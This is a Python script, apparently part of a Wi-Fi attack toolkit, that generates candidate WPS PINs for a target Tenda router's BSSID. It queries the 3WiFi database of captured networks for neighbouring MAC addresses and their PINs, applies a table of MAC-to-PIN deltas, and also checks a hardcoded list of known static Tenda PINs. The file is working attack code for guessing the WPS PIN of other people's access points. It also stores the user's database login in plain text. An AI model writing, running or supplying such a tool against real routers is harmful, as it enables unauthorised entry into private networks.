# -*- coding: utf-8 -*-
import argparse
from collections import OrderedDict, defaultdict
import json
import statistics

import py3wifi
import wpspin

# Tenda's DeltaMAC -> DeltaPINs hashmap
# DeltaPINs are sorted by frequency
deltas_table = {int(k): v for k, v in json.load(open('tenda_deltas.json', encoding='utf-8')).items()}
max_deltamac = max(deltas_table)


def mac2dec(mac):
    mac = mac.replace(':', '')
    return int(mac, 16)


def dec2mac(mac):
    mac = hex(mac).split('x')[-1].upper()
    mac = mac.zfill(12)
    for pos in range(10, 0, -2):
        mac = mac[:pos] + ':' + mac[pos:]
    return mac


def incMAC(mac, value):
    '''Increments MAC address'''
    mac = mac2dec(mac) + value
    return dec2mac(mac)


def containsAlgo(t_mac, wps_pin, pinGen):
    '''Checks if a WPS PIN is generated according to a known algorithm'''
    common_static = ('00000000', '12345670', '12345678')
    tenda_static = ('03436080', '03436165', '03974247', '06966409',
                    '09278325', '19967899', '25086164', '25563818',
                    '25777390', '27334737', '35806691', '45304347', '50542208',
                    '63410372', '63491838', '71294988', '74250226')
    if (wps_pin in common_static) or (wps_pin in tenda_static):
        return 'Static PIN: {}'.format(wps_pin)
    mac_list = [t_mac, incMAC(t_mac, -1), incMAC(t_mac, +1)]
    for mac in mac_list:
        wpsPins = pinGen.getAll(mac=mac, get_static=False)
        for item in wpsPins:
            if item['pin'] == wps_pin:
                return item['name']
    return False


def subMAC(mac1, mac2):
    """Substracts the first MAC the second MAC"""
    mac1, mac2 = mac2dec(mac1), mac2dec(mac2)
    return mac1 - mac2


def createParser():
    parser = argparse.ArgumentParser(
        description='''Experimental online PIN code generator
        for some Tenda devices.
        Uses 3WiFi Wireless Database to get anchor points.'''
        )
    parser.add_argument(
        'bssid',
        nargs='?',
        type=str,
        help='the target BSSID'
        )
    parser.add_argument(
        '-i',
        '--ignore-pin',
        action='store_true',
        default=False,
        help='ignore if pin to BSSID is found in 3WiFi'
        )
    parser.add_argument(
        '-a',
        '--anchors',
        type=int,
        default=0,
        help='maximum number of anchor BSSIDs used for the search PINs \
        Default: unlimited'
        )
    parser.add_argument(
        '-m',
        '--mode',
        choices=['classical', 'unified', 'unified1'],
        default='classical',
        help='WPS PIN list mode: classical, unified, unified1. Default:  %(default)s')
    parser.add_argument(
        '--major-deltas-only',
        action='store_true',
        default=False,
        dest='major_only',
        help='Use only major DeltaPINs (occur more than 1 time)'
        )

    return parser


if __name__ == '__main__':
    parser = createParser()
    namespace = parser.parse_args()

    try:
        with open('account.txt', 'r', encoding='utf-8') as file:
            login, password = file.read().strip().split(':')
    except FileNotFoundError:
        print('You need to log in to 3WiFi')
        login = input('Username: ')
        password = input('Password: ')
        try:
            client = py3wifi.Client(login=login, password=password)
            client.auth()
        except py3wifi.exceptions.AuthError:
            print('Authorization failed. Please check username and password.')
            exit(1)
        else:
            with open('account.txt', 'w', encoding='utf-8') as file:
                file.write('{}:{}'.format(login, password))
            print('The credentials were written to account.txt')
    else:
        try:
            client = py3wifi.Client(login=login, password=password)
            client.auth()
        except py3wifi.exceptions.AuthError:
            print('Authorization failed. Please check username and password.')
            exit(1)
    print('Authorization is successful')

    if namespace.bssid:
        target_bssid = namespace.bssid
    else:
        target_bssid = input('Please specify the BSSID: ')
    target_bssid = target_bssid.upper()

    # Generating a mask: 11:22:33:44:55:66 -> 11:22:33:44:5*
    mask = ':'.join(target_bssid.split(':')[:-1])[:-1] + '*'
    print('[*] Requesting 3WiFi for "{}"…'.format(mask))
    res = client.request('find', {'bssid': mask, 'wps': '□□□□□□□□'})['data']
    if not res:
        print('[-] Not found similar BSSIDs in the 3WiFi')
        exit(1)
    print('[+] Found {} records'.format(len(res)))

    # Filtering and processing 3WiFi data
    pinGen = wpspin.WPSpin()
    data = {}
    for item in res:
        bssid = item['bssid']
        pin = item['wps']
        if (not namespace.ignore_pin) and (bssid == target_bssid):
            print('The PIN for {} was found in 3WiFi: {}'.format(
                target_bssid, pin)
            )
            exit(0)
        if not containsAlgo(bssid, pin, pinGen) and (bssid not in data):
            data[bssid] = int(pin[:-1])

    # Dictionary of deltaMAC as key and BSSID/PIN as value
    deltas = {}

    # Calculating all deltaMACs
    for bssid, pin in data.items():
        deltaMac = subMAC(bssid, target_bssid)
        if (deltaMac != 0) and (deltaMac not in deltas) \
                and (abs(deltaMac) <= max_deltamac):
            deltas[deltaMac] = {'bssid': bssid, 'pin': pin}

    # Sorting deltaMACs as absolutely values
    if deltas:
        deltas = OrderedDict(
            sorted(deltas.items(), key=lambda x: abs(x[0]))
            )
        print('[+] {} anchor points defined'.format(len(deltas)))
    else:
        print('[-] Not found anchor points')
        exit(1)

    pins = OrderedDict()
    anchor_cnt = 0
    for deltaMac, value in deltas.items():
        bssid = value['bssid']
        pin = value['pin']
        temp_pins = []
        if abs(deltaMac) not in deltas_table:
            continue
        for element in deltas_table[abs(deltaMac)]:
            count = element['count']
            deltaPin = element['deltapin']
            if namespace.major_only and (count <= 1):
                continue
            if deltaMac > 0:
                rest_pin = pin - deltaPin
            else:
                rest_pin = pin + deltaPin
            rest_pin %= int(1e7)
            rest_pin = (str(rest_pin) + str(pinGen.checksum(rest_pin))).zfill(8)
            temp_pins.append({
                'pin': rest_pin,
                'deltapin': deltaPin,
                'deltapin_count': count
            })
        pins[bssid] = {'pins': temp_pins, 'deltamac': deltaMac}
        if namespace.anchors != 0:
            anchor_cnt += 1
            if anchor_cnt == namespace.anchors:
                break

    if not pins:
        print('[-] No known DeltaPINs found')
        exit(1)

    if namespace.mode == 'classical':
        for bssid, value in pins.items():
            pin_list = value['pins']
            deltaMac = value['deltamac']
            if pin_list:
                print('\nPINs generated with {} (deltaMAC: {}; count: {}):'.format(
                    bssid, deltaMac, len(pin_list)))
                print('{:<4} {:<10} {:<10} {:<14} {}'.format(
                    '№', 'WPS PIN', 'deltaPIN', 'deltaPIN_cnt', 'isMajorDeltaPIN'))
                for i, pin in enumerate(pin_list):
                    n = i + 1
                    # Pretty printing
                    print('{:<4} {:<10} {:<10} {:<14} {}'.format(
                        str(n) + ')', pin['pin'], pin['deltapin'],
                        pin['deltapin_count'], str(pin['deltapin_count'] > 1)))
    elif namespace.mode == 'unified':
        # Create combined list without repetitions with relevant sorting
        pin_lists = []
        for bssid, value in pins.items():
            pin_lists.append(value['pins'])
        pins = defaultdict(lambda: [0, 0])
        for pin_list in pin_lists:
            for index, pin_obj in enumerate(pin_list):
                pin = pin_obj['pin']
                pins[pin][0] += 1
                pins[pin][1] += -index
        pins = OrderedDict(
            sorted(pins.items(), key=lambda x: (x[1][0], x[1][1]), reverse=True)
            )
        print('{:<5} {:<10} {}'.format(
                    '№', 'WPS PIN', 'X'))
        n = 1
        for pin, weights in pins.items():
            # Pretty printing
            print('{:<5} {:<10} {}'.format(
                str(n) + ')', pin, weights[0]))
            n += 1
    elif namespace.mode == 'unified1':
        # Create combined list without repetitions with relevant sorting v2
        pin_lists = []
        for bssid, value in pins.items():
            pin_lists.append(value['pins'])
        pins = defaultdict(lambda: [0, []])
        for pin_list in pin_lists:
            for index, pin_obj in enumerate(pin_list):
                pin = pin_obj['pin']
                pins[pin][0] += 1
                pins[pin][1].append(index)
        pins = OrderedDict(
            sorted(pins.items(), key=lambda x: (x[1][0], statistics.mean(x[1][1])), reverse=True)
            )
        print('{:<5} {:<10} {}'.format(
                    '№', 'WPS PIN', 'X'))
        n = 1
        for pin, weights in pins.items():
            # Pretty printing
            print('{:<5} {:<10} {}'.format(
                str(n) + ')', pin, weights[0]))
            n += 1
